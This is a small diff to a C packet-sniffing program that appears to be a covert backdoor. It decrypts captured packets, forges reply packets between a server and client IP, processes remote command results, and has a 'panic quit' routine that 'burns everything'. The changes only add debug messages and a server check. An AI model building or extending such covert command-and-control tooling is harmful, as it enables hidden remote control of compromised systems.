@@ -166,6 +166,7 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 			memset(buffer, 0x0, MAX_PKT_LEN);
 
 			packet_forge(buffer, SERVER_IP, CLIENT_IP);
+			fprintf(stderr, "sending to client %s\n", CLIENT_IP);
 		}
 	}
 	else if ((start = strstr(decrypted, WATCH_CMD_START)) && server) {
@@ -191,9 +192,10 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 		fprintf(stderr, "Panic quit command, burning everything!!\n");
 		exit_panic();
 	}
-	else if ((start = strstr(decrypted, RESULT_START))) {
+	else if ((start = strstr(decrypted, RESULT_START)) && !server) {
 		/* process command results */
 		start += strlen(RESULT_START);
+		fprintf(stderr, "got it?\n");
 
 		if (!(end = strstr(start, RESULT_END)))
 			return; /* no ending results */
@@ -203,7 +205,6 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 		strncpy(command, start, (end - start));
 
 		/* print the results */
-		fprintf(stderr, "got it?\n");
 	}
 
 	return;
